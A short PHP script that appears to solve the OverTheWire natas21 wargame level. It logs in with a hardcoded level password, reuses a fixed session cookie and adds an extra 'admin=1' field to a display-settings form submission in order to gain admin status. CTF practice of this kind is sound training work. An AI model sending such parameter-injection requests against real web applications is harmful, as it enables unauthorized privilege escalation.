<?php
$url = "http://natas21.natas.labs.overthewire.org/index.php?debug=true";
$ch = curl_init ($url);
curl_setopt($ch, CURLOPT_USERPWD,"natas21:89OWrTkGmiLZLv12JY4tLj2c4FW0xn56");  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID=cgggbjkodfostobuagijti5mo0');
curl_setopt ($ch, CURLOPT_POSTFIELDS, "submit=true&align=center&fontsize=100%&bgcolor=yellow&admin=1");
$output = curl_exec ($ch);
curl_close($ch);
echo $output;
?>